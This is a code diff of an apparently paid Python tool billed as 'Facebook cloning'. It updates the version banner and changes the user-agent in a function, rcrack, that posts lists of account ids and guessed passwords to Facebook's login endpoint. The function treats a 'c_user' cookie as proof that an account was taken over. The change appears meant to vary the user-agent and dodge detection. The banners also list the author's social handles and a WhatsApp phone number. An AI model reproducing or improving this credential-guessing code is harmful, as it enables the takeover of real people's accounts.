@@ -116,7 +116,7 @@ logo=("""\033[1;32m
 \033[1;93m--------------------------------------------------
   \033[1;32mFACEBOOK  : Raziqullah Saadat
   \033[1;32mYOUTUBE   : @Saadat
-  \033[1;32mVERSION   : 0.4
+  \033[1;32mVERSION   : 0.5
   \033[1;32mOWNER     : Raziqullah Saadat
 --------------------------------------------------
 \033[1;37m[-]Dear Paid user:
@@ -868,7 +868,7 @@ def rcrack(ids,passlist):
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
-           'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
+           'user-agent': pro}
 			lo = session.post('https://web.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			if 'c_user' in log_cookies:
@@ -922,7 +922,7 @@ def menu_apikey():
 \033[1;37m[-] GITHUB    :\033[1;32m Saadat
 \033[1;37m[-] WhatsApp  :\033[1;32m +93702856593
 \033[1;37m[-] TOOLS     :\033[1;32m MIX CLONING
-\033[1;37m[-] VERSION   :\033[1;32m 0.4
+\033[1;37m[-] VERSION   :\033[1;32m 0.5
 \033[1;37m[-] STATUS    :\033[1;32m PAID
 ==================================================
 \033[1;33m[*]TOOLS  : Facebook cloning
